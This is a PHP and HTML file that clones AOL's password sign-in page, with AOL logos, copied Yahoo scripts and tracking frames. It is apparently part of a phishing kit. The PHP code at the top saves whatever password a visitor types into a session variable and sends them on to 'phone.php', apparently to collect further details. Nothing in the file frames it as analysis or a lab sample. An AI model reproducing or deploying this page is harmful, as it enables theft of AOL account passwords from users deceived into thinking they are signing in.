<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION["password"] = $_POST["password"];
    header("Location: phone.php");
}
?>

<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="js grid light-theme ">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="oath:guce:consent-host" content="guce.aol.com">
    <title>AOL</title>
    <meta name="description" content="AOL">
    <link rel="dns-prefetch" href="//gstatic.com">
    <link rel="dns-prefetch" href="//google.com">
    <link rel="dns-prefetch" href="//s.yimg.com">
    <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
    <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
    <link rel="dns-prefetch" href="//geo.query.yahoo.com">
    <link rel="dns-prefetch" href="//geo.yahoo.com">
    <link rel="icon" type="image/png" href="wm/login/aol-favicon.png">
    <link rel="shortcut icon" type="image/png" href="wm/login/aol-favicon.png">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
    <link rel="apple-touch-icon" href="wm/login/aol-apple-touch-icon.png">
    <link rel="apple-touch-icon-precomposed" href="wm/login/aol-apple-touch-icon.png">
    <style nonce="">
        #mbr-css-check {
            display: inline;
        }
    </style>
    <link href="aol-main.css" rel="stylesheet"
        type="text/css">
    <script nonce="">
        var pageStartTime = new Date().getTime();
        (function (root) {
            var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
            root.isGoodJS = isGoodJS;
        }(this));

        (function (root) {
            /* -- Data -- */
            root.YUI_config = { "comboBase": "https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?", "combine": true, "root": "yui-s:3.18.0\u002F" };
            root.I13N_config = { "keys": { "pt": "utility", "ver": "nodejs" } };
            root.I13N_config || (root.I13N_config = {});
            root.I13N_config.spaceid = 160500005;
            root.I13N_config.location = "https:\u002F\u002Flogin.aol.com\u002Faccount\u002Fchallenge\u002Fpassword?src=fp-us&intl=us&pspid=1197803361&activity=default&display=login";
            root.I13N_config.referrer = "https:\u002F\u002Flogin.aol.com\u002F?src=fp-us&intl=us&pspid=1197803361&activity=default";
            root.I13N_config.keys || (root.I13N_config.keys = {});
            root.I13N_config.keys.pg_name = "passwordChallenge";
            root.I13N_config.keys.gm_np = "aol";
            root.I13N_config.keys.src = "fp-us";
            root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
            root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
            root.I13N_config.keys.test = "mbr-whatsapp-ac,mbr-whatsapp-aol-non-hc,mbr-othcookie-version,mbr-2sv-redesign-sms,mbr-2sv-security-key,mbr-whatsapp-nac,mbr-ar-cc,mbr-fido-upsell-desktop2,mbr-request-imapin-scopes-ym";
            root.I13N_config.keys.cause = "default";
            root.I13N_config.keys.src_id = "1197803361";
            root.COMET_URL = "https:\u002F\u002Fserver.comet.yahoo.com\u002Fcomet";
            root.gamIframeUrl = "https:\u002F\u002Fgpt.mail.yahoo.net\u002Fsandbox?client=aolLogin&version=0.1&limited=0&headerBidder=1&haq=1&benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22__PPId__%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22mbr-whatsapp-ac%2Cmbr-whatsapp-nac%2Cmbr-ar-cc%2Cmbr-fido-upsell-desktop2%2Cmbr-request-imapin-scopes-ym%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22ir2%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22us%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22__AXId__%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22mbr-whatsapp-ac%22%2C%22mbr-whatsapp-nac%22%2C%22mbr-ar-cc%22%2C%22mbr-fido-upsell-desktop2%22%2C%22mbr-request-imapin-scopes-ym%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22us%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22__DV360__%22%2C%22AXId%22%3A%22__AXId__%22%7D%7D";
            root.challenge || (root.challenge = {});
            root.challenge.servingStamp = 1730986309280;
            root.challenge.isAndroidWebview = false;
            root.I13N_config.keys.pct = "signin";
            root.I13N_config.keys.milestone = "signin";
            root.pwchallenge || (root.pwchallenge = {});
            root.pwchallenge.messages = { "toolTipShow": "Show&nbsp;password", "toolTipHide": "Hide&nbsp;password" };
            root.isIOSDevice = false;
        }(this));


        YUI_config.global = window;


        window.mbrSendError = function (name, url) {
            (new Image()).src = '/account/js-reporting/?rid=7aauccpjipga5&crumb=' + encodeURIComponent('2oZOK6RIT3rxzVtiVUsHA') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
        };

        var oldError = window.onerror;

        var allowListedErrorScripts = ["bundle.js"];
        window.onerror = function (errorMsg, url, lineNumber, column, errorObj) {
            const fileName = url ? url.split('/').pop() : null;
            if (fileName && allowListedErrorScripts.indexOf(fileName) > -1) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            }
        }

    </script>
</head>

<body
    class="bucket-mbr-whatsapp-ac bucket-mbr-whatsapp-nac bucket-mbr-ar-cc bucket-mbr-fido-upsell-desktop2 bucket-mbr-request-imapin-scopes-ym">
    <script nonce="">
            (function (root) {
                var doc = document;
                if (root.isGoodJS) {
                    doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                }
            }(this));
    </script>
    <div id="login-body" class="loginish  puree-v2 responsive  grid   ">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo "
                        width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo " width="100" height="">
                </a>
            </span>
            <div class="desktop-universal-header">
                <a href="https://help.aol.com/" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerHelp">Help</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="universal-header-links"
                    data-rapid-tracking="true" data-ylk="elm:link;elmt:link;slk:headerTerms">Terms</a>
                <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html"
                    class="universal-header-links privacy-link" data-rapid-tracking="true"
                    data-ylk="elm:link;elmt:link;slk:headerPrivacy">Privacy</a>
            </div>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div class="mbr-login-hd txt-align-center">
                    <img src="wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol"
                        class="logo aol-en-US" width="100" height="">
                    <img src="wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol"
                        class="dark-mode-logo logo aol-en-US" width="100" height="">
                </div>
                <div class="challenge password-challenge">
                    <div class="challenge-header">
                        <!-- <div class="yid"></div> -->
                    </div>
                    <div id="password-challenge" class="primary">
                        <strong class="challenge-heading">Enter&nbsp;password</strong>
                        <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
                        <form action="" method="post" class="challenge-form ">
                            <input type="hidden" name="browser-fp-data" id="browser-fp-data"
                                value="{&quot;language&quot;:&quot;en-US&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1.5,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:480,&quot;timezone&quot;:&quot;America/Los_Angeles&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;unknown&quot;,&quot;plugins&quot;:{&quot;count&quot;:5,&quot;hash&quot;:&quot;2c14024bf8584c3f7f63f24ea490e812&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 620 (0x00005916) Direct3D11 vs_5_0 ps_5_0, D3D11)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:1,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:10,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:49,&quot;hash&quot;:&quot;411659924ff38420049ac402a30466bc&quot;},&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1280&quot;,&quot;h&quot;:&quot;720&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;720&quot;,&quot;h&quot;:&quot;1280&quot;},&quot;ts&quot;:{&quot;serve&quot;:1730986309280,&quot;render&quot;:1730986310247}}">
                            <input type="hidden" name="crumb" value="2oZOK6RIT3rxzVtiVUsHA">
                            <input type="hidden" name="acrumb" value="dbwqs9vc">
                            <input type="hidden" name="sessionIndex" value="QQ--">
                            <input type="hidden" name="displayName" value="">
                            <div class="hidden-username">
                                <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                                    autocorrect="off" spellcheck="false" name="username" value="">
                            </div>
                            <input type="hidden" name="passwordContext" value="normal">
                            <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value="">
                            <input type="hidden" name="showButtonStatus" id="show-button-status" value="">
                            <input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion" value="">

                            <div id="password-container" class="input-group password-container blurred">
                                <input type="password" id="login-passwd" class="password" name="password"
                                    placeholder=" " autofocus="" autocomplete="current-password"
                                    data-rapid-tracking="true"
                                    data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd">
                                <label for="login-passwd" id="password-label" class="password-label">Password</label>
                                <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
                                <button type="button" class="show-hide-toggle-button hide-pw"
                                    id="password-toggle-button" tabindex="-1" title="Show&nbsp;password"
                                    data-rapid-tracking="true"
                                    data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
                                </button>
                            </div>
                            <div class="reverse-order">
                                <div class="button-container">
                                    <button type="submit" id="login-signin"
                                        class="pure-button puree-button-primary puree-spinner-button challenge-button"
                                        name="verifyPassword" value="verifyPasswordPrimary" data-rapid-tracking="true"
                                        data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                                        Next
                                    </button>
                                </div>
                                <div class="forgot-cont challenge-button-link">
                                    <input type="submit" class="pure-button puree-button-link challenge-button-link"
                                        data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery"
                                        data-rapid-tracking="true" id="mbr-forgot-link" name="skip"
                                        value="Forgot&nbsp;password?">
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1></h1>
                <p></p>
            </div>
        </div>
        <div class="login-bg-outer">
            <div class="login-bg-inner">
                <div id="login-ad-rich" aria-hidden="true">
                    <iframe id="login-ads-gpt-iframe"
                        allow="geolocation 'none'; fullscreen 'none'; autoplay 'none'; camera 'none'; display-capture 'none'; document-domain 'none'; microphone 'none'; gyroscope 'none'; magnetometer 'none'; midi 'none'; payment 'none'; serial 'none'; speaker-selection 'none'"
                        sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
                        width="1440" height="1024" scrolling="no" frameborder="no"
                        src="https://gpt.mail.yahoo.net/sandbox?client=aolLogin&amp;version=0.1&amp;limited=0&amp;headerBidder=1&amp;haq=1&amp;benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22792d45332e7239584a4532754c487539654346415361424542415f4b6542414a46357e41%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22mbr-whatsapp-ac%2Cmbr-whatsapp-nac%2Cmbr-ar-cc%2Cmbr-fido-upsell-desktop2%2Cmbr-request-imapin-scopes-ym%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22ir2%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22us%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22mbr-whatsapp-ac%22%2C%22mbr-whatsapp-nac%22%2C%22mbr-ar-cc%22%2C%22mbr-fido-upsell-desktop2%22%2C%22mbr-request-imapin-scopes-ym%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22us%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22eS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%7D"></iframe>
                </div>
            </div>
        </div>
    </div>
    <script src="ss/rapid-3.53.39.js"></script>
    <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
    </script>
    <script src="wm/mbr/8218dc35a45c1f7b84d843e04ae1560b00f4bd05/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=2oZOK6RIT3rxzVtiVUsHA&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword"
            height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script src="https://consent.cmp.oath.com/cmp.js"></script><iframe name="__uspapiLocator"
        style="display: none;"></iframe><iframe name="__tcfapiLocator" style="display: none;"></iframe><iframe
        name="__gppLocator" style="display: none;"></iframe>
    <script src="https://opus.analytics.yahoo.com/tag/opus.js"></script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and
            some AOL features may not work properly. Please update your browser version now. <a
                href="">More&nbsp;Info</a>
        </p>
    </div>
    <script nonce="">
        (function (root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>


    <iframe frameborder="0" height="0" width="0"
        src="https://opus.analytics.yahoo.com/tag/opus-frame.html?referrer=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword%3Fsrc%3Dfp-us%26client_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26pspid%3D1197803361%26activity%3Ddefault%26done%3Dhttps%253A%252F%252Fapi.login.aol.com%252Foauth2%252Fauthorize%253Fclient_id%253Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%2526intl%253Dus%2526nonce%253D6ldE2VGUSRxVl3qyjb4vSEnXlUoRGHKV%2526redirect_uri%253Dhttps%25253A%25252F%25252Foidc.www.aol.com%25252Fcallback%2526response_type%253Dcode%2526scope%253Dmail-r%252520openid%252520guce-w%252520openid2%252520sdps-r%2526src%253Dfp-us%2526state%253DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E%26sessionIndex%3DQQ--%26acrumb%3Ddbwqs9vc%26display%3Dlogin%26authMechanism%3Dprimary&amp;tbla_id=603327cf-0d2e-4657-853c-700d29500c61-tucte263eb7&amp;axids=gam%3Dy-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%26dv360%3DeS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%26ydsp%3Dy-6AUvHcRE2uLkWsh0_wwqQVnwTUs0ZCoL~A%26tbla%3Dy-9_bHinJE2uISm8GrIDqzR37VBi06Hau3~A&amp;gdpr=false&amp;gdpr_consent=&amp;gpp=DBAA&amp;gpp_sid=-1&amp;us_privacy=1---"
        style="display: none;"></iframe>
</body>

</html>